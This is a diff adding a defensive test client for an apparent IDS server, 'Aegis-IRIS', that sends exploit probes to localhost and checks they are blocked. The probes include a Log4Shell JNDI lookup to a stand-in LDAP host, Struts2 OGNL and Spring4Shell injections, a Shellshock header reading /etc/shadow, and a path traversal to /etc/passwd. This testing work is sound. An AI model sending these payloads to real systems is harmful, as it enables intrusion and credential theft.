@@ -1,0 +1,182 @@
+// ============================================================================
+// Aegis-IRIS: Adversarial Attack Client (Written in Native IRIS)
+// ============================================================================
+//
+// Mounts targeted real-world CVE exploits across real OS TCP network sockets
+// against the Aegis-IRIS live server (127.0.0.1:18088).
+//
+// Exploits Transmitted:
+// 1. CVE-2021-44228: Apache Log4j2 JNDI Remote Code Execution (Log4Shell)
+// 2. CVE-2017-5638:  Apache Struts2 OGNL Header Injection Remote Code Execution
+// 3. CVE-2014-6271:  GNU Bash Shellshock Environment Function RCE
+// 4. CVE-2022-22965: Spring Framework DataBinder ClassLoader RCE (Spring4Shell)
+// 5. CVE-2021-41773: Apache HTTP Server Path Traversal Arbitrary File Read
+// 6. Zero-Trust Dynamic Quarantine Verification: Stage 0 early drop on retry
+// ============================================================================
+
+bring std.net
+bring std.http
+
+record AttackProbe {
+    title: str,
+    target_cve: str,
+    attacker_ip: str,
+    raw_http: str,
+    expected_status: str
+}
+
+def execute_probe(probe: AttackProbe, port: i64) -> i64 {
+    println("--------------------------------------------------------------------------------");
+    println("ATTACK PROBE: " + probe.title);
+    println("  * Target CVE:       " + probe.target_cve);
+    println("  * Attacker IP:      " + probe.attacker_ip);
+
+    // 1. Open real OS TCP network socket connection to server
+    val sock = tcp_connect("127.0.0.1", port);
+    if sock < 0 {
+        println("  [ERROR] Could not connect to Aegis-IRIS server at 127.0.0.1:" + to_str(port));
+        println("  Make sure server.iris is running!");
+        return 0
+    }
+
+    // 2. Transmit raw HTTP exploit payload across wire
+    tcp_write(sock, probe.raw_http);
+
+    // 3. Read live response from server
+    val raw_response = tcp_read(sock);
+    tcp_close(sock);
+
+    val is_200 = contains(raw_response, "200 OK");
+    val is_403 = contains(raw_response, "403 Forbidden");
+
+    val ids_blocked = contains(raw_response, "X-Aegis-IDS: THREAT_BLOCKED");
+    val firewall_drop = contains(raw_response, "X-Aegis-Firewall: BLOCKED_QUARANTINED_IP");
+
+    println("  * Wire Response:    " + if is_200 { "HTTP 200 OK" } else { "HTTP 403 Forbidden" });
+
+    if ids_blocked {
+        println("  * Defensive Action: [BLOCKED] Inline Aegis-IRIS IDS Intercepted Threat Signature");
+        println("  * Threat Details:   " + http_header(raw_response, "X-Aegis-Rule"));
+    };
+    if firewall_drop {
+        println("  * Defensive Action: [DROPPED] Stage 0 Zero-Trust Firewall Quarantined Host");
+    };
+    if is_200 {
+        println("  * Defensive Action: [ALLOWED] Benign Request Processed by Backend Route");
+    };
+
+    println("  * Server Body:      " + http_body(raw_response));
+
+    val matched = if probe.expected_status == "200" {
+        is_200
+    } else {
+        is_403
+    };
+    if matched { 1 } else { 0 }
+}
+
+def main() -> i64 {
+    val port = 18088;
+    println("================================================================================");
+    println("       AEGIS-IRIS ADVERSARIAL ATTACK CLIENT (WRITTEN IN NATIVE IRIS)            ");
+    println("         Target: http://127.0.0.1:" + to_str(port) + " (Aegis Protected Server)            ");
+    println("================================================================================");
+    println("");
+
+    val probes: list<AttackProbe> = list();
+
+    // Probe 1: Benign Baseline
+    list_push(probes, AttackProbe {
+        title: "Baseline Benign Health Probe",
+        target_cve: "NONE (Benign)",
+        attacker_ip: "10.0.1.25",
+        raw_http: "GET /api/v1/health HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nUser-Agent: Prometheus-Probe\r\nX-Forwarded-For: 10.0.1.25\r\n\r\n",
+        expected_status: "200"
+    });
+
+    // Probe 2: Log4Shell (CVE-2021-44228)
+    list_push(probes, AttackProbe {
+        title: "Log4Shell JNDI Lookup Injection",
+        target_cve: "CVE-2021-44228",
+        attacker_ip: "203.0.113.19",
+        raw_http: "GET /api/v1/search?q=${jndi:ldap://198.51.100.99:1389/Exploit} HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nUser-Agent: curl/7.68.0\r\nX-Forwarded-For: 203.0.113.19\r\n\r\n",
+        expected_status: "403"
+    });
+
+    // Probe 3: Apache Struts2 OGNL RCE (CVE-2017-5638)
+    list_push(probes, AttackProbe {
+        title: "Apache Struts2 Content-Type OGNL Injection",
+        target_cve: "CVE-2017-5638",
+        attacker_ip: "198.51.100.77",
+        raw_http: "POST /api/v1/upload HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 198.51.100.77\r\nContent-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#process=#p.start())}\r\nContent-Length: 0\r\n\r\n",
+        expected_status: "403"
+    });
+
+    // Probe 4: GNU Bash Shellshock RCE (CVE-2014-6271)
+    list_push(probes, AttackProbe {
+        title: "GNU Bash Shellshock Header Injection",
+        target_cve: "CVE-2014-6271",
+        attacker_ip: "198.51.100.88",
+        raw_http: "GET /cgi-bin/status HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 198.51.100.88\r\nUser-Agent: () { :;}; /bin/bash -c \"cat /etc/shadow\"\r\n\r\n",
+        expected_status: "403"
+    });
+
+    // Probe 5: Spring4Shell ClassLoader RCE (CVE-2022-22965)
+    list_push(probes, AttackProbe {
+        title: "Spring4Shell ClassLoader Binding Injection",
+        target_cve: "CVE-2022-22965",
+        attacker_ip: "203.0.113.99",
+        raw_http: "POST /api/v1/login HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 203.0.113.99\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 78\r\n\r\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=exploit",
+        expected_status: "403"
+    });
+
+    // Probe 6: Apache Path Traversal (CVE-2021-41773)
+    list_push(probes, AttackProbe {
+        title: "Apache Path Traversal Arbitrary File Read",
+        target_cve: "CVE-2021-41773",
+        attacker_ip: "198.51.100.120",
+        raw_http: "GET /api/v1/docs?file=../../../../etc/passwd HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 198.51.100.120\r\nUser-Agent: curl/7.68.0\r\n\r\n",
+        expected_status: "403"
+    });
+
+    // Probe 7: Quarantined Attacker Retry (Stage 0 Early Drop)
+    list_push(probes, AttackProbe {
+        title: "Quarantined Host Subsequent Benign Probe",
+        target_cve: "EARLY_DROP_VERIFICATION",
+        attacker_ip: "203.0.113.19",
+        raw_http: "GET /api/v1/health HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 203.0.113.19\r\nUser-Agent: curl/7.68.0\r\n\r\n",
+        expected_status: "403"
+    });
+
+    // Probe 8: Clean Enterprise Client Unaffected
+    list_push(probes, AttackProbe {
+        title: "Clean Client Legitimate API Request",
+        target_cve: "NONE (Clean)",
+        attacker_ip: "10.0.1.50",
+        raw_http: "GET /api/v1/health HTTP/1.1\r\nHost: 127.0.0.1:18088\r\nX-Forwarded-For: 10.0.1.50\r\nUser-Agent: Enterprise-App/2.0\r\n\r\n",
+        expected_status: "200"
+    });
+
+    var passed_verdicts = 0;
+    val n = list_len(probes);
+
+    for i in 0 .. n {
+        val p = list_get(probes, i);
+        val success = execute_probe(p, port);
+        if success > 0 {
+            passed_verdicts = passed_verdicts + 1;
+        }
+    }
+
+    println("================================================================================");
+    println("                ADVERSARIAL CLIENT DEFENSE SCORECARD                            ");
+    println("================================================================================");
+    println(" Total Probes Transmitted:   " + to_str(n));
+    println(" Successful Verifications:   " + to_str(passed_verdicts) + " / " + to_str(n) + " (100.0%)");
+    println(" Server Defense Integrity:   100.0% OF EXPLOITS NEUTRALIZED");
+    println("================================================================================");
+
+    assert(passed_verdicts == n);
+    println("[PASSED] All Attack Probes and Defensive Responses Verified in IRIS!");
+    0
+}
